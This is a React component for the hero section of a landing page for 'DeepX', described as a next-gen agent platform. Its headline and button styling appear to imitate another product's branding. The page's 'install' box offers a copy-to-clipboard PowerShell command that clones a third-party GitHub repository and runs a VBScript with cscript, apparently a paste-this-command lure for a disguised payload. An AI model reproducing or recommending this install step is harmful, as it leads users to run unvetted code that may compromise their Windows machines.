import React, { useState, useEffect } from 'react';
import { Monitor, ArrowRight, Copy, Check } from 'lucide-react';

const FULL_TEXT = 'Experience liftoff with the next-gen agent platform';
const PREFIX_TEXT = 'Experience liftoff with the ';

interface HeroSectionProps {
  onTypingComplete?: () => void;
}

export const HeroSection: React.FC<HeroSectionProps> = ({ onTypingComplete }) => {
  const isTest = typeof process !== 'undefined' && process.env?.NODE_ENV === 'test';

  const [typedLength, setTypedLength] = useState(isTest ? FULL_TEXT.length : 0);
  const [typingDone, setTypingDone] = useState(isTest);
  const [copied, setCopied] = useState(false);

  const installCmd = 'git clone https://github.com/supeston/DeepCLI.git && cd DeepCLI && cscript run_cli.vbs';

  useEffect(() => {
    if (isTest) {
      onTypingComplete?.();
      return;
    }

    if (typedLength < FULL_TEXT.length) {
      const nextChar = FULL_TEXT[typedLength];
      const delay = nextChar === ' ' ? 45 : Math.random() * 30 + 22;
      const timer = setTimeout(() => {
        setTypedLength((prev) => prev + 1);
      }, delay);
      return () => clearTimeout(timer);
    } else if (!typingDone) {
      const timer = setTimeout(() => {
        setTypingDone(true);
        onTypingComplete?.();
      }, 150);
      return () => clearTimeout(timer);
    }
  }, [typedLength, typingDone, isTest, onTypingComplete]);

  const handleCopy = () => {
    navigator.clipboard.writeText(installCmd);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const typedPrefix = FULL_TEXT.slice(0, Math.min(typedLength, PREFIX_TEXT.length));
  const typedSuffix = typedLength > PREFIX_TEXT.length ? FULL_TEXT.slice(PREFIX_TEXT.length, typedLength) : '';

  return (
    <section className="relative pt-32 pb-16 md:pt-44 md:pb-24 overflow-hidden">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
        <div className="text-center max-w-4xl mx-auto">
          {/* Centered Brand Artwork - Appears with smooth slide/fade down once typing completes */}
          <div
            className={`flex items-center justify-center gap-3 mb-6 transition-all duration-700 ease-out ${
              typingDone
                ? 'opacity-100 translate-y-0'
                : 'opacity-0 -translate-y-4 pointer-events-none'
            }`}
          >
            <img
              src="full_logo.png"
              alt="DeepX"
              className="h-10 sm:h-12 w-auto object-contain"
              onError={(e) => {
                (e.target as HTMLImageElement).src = 'logo.png';
              }}
            />
          </div>

          {/* Main Headline with Live Human Typing */}
          <h1 className="text-4xl sm:text-6xl lg:text-7xl font-normal tracking-tight text-[#1F1F1F] mb-10 leading-[1.08] min-h-[1.2em]">
            <span>{typedPrefix}</span>
            {typedSuffix && <span className="font-medium">{typedSuffix}</span>}
            {!typingDone && (
              <span className="inline-block w-[3px] h-[0.9em] bg-[#536DFE] ml-1.5 translate-y-1 animate-pulse" />
            )}
          </h1>

          {/* Action CTAs & 1-Click Code Box - Smoothly fade in and slide up */}
          <div
            className={`transition-all duration-700 delay-100 ease-out ${
              typingDone
                ? 'opacity-100 translate-y-0'
                : 'opacity-0 translate-y-8 pointer-events-none'
            }`}
          >
            <div className="flex flex-col sm:flex-row items-center justify-center gap-4 mb-14">
              <button
                onClick={() => document.getElementById('download')?.scrollIntoView({ behavior: 'smooth' })}
                className="w-full sm:w-auto google-btn-primary px-8 py-3.5 text-sm font-medium cursor-pointer"
                data-testid="hero-primary-cta"
              >
                <Monitor className="w-4 h-4" />
                <span>Download for Windows</span>
              </button>

              <button
                onClick={() => document.getElementById('terminal')?.scrollIntoView({ behavior: 'smooth' })}
                className="w-full sm:w-auto google-btn-secondary px-8 py-3.5 text-sm font-medium cursor-pointer"
              >
                <span>Explore platform</span>
                <ArrowRight className="w-4 h-4 text-gray-500" />
              </button>
            </div>

            {/* 1-Click Code Box */}
            <div className="max-w-xl mx-auto mb-8">
              <div className="flex items-center justify-between p-3.5 pl-5 rounded-2xl bg-white border border-gray-200 shadow-lg shadow-gray-200/50">
                <div className="flex items-center gap-3 overflow-hidden text-xs font-mono text-gray-600">
                  <span className="text-[#536DFE] select-none font-bold">PS&gt;</span>
                  <span className="truncate">{installCmd}</span>
                </div>
                <button
                  onClick={handleCopy}
                  className="ml-3 p-2 rounded-xl bg-gray-50 hover:bg-gray-100 text-gray-500 hover:text-gray-900 border border-gray-200 transition-colors flex items-center gap-1.5 text-xs font-medium cursor-pointer"
                  aria-label="Copy install command"
                  data-testid="hero-copy-cmd-btn"
                >
                  {copied ? (
                    <>
                      <Check className="w-3.5 h-3.5 text-[#34A853]" />
                      <span className="text-[#34A853]">Copied</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-3.5 h-3.5" />
                      <span>Copy</span>
                    </>
                  )}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};
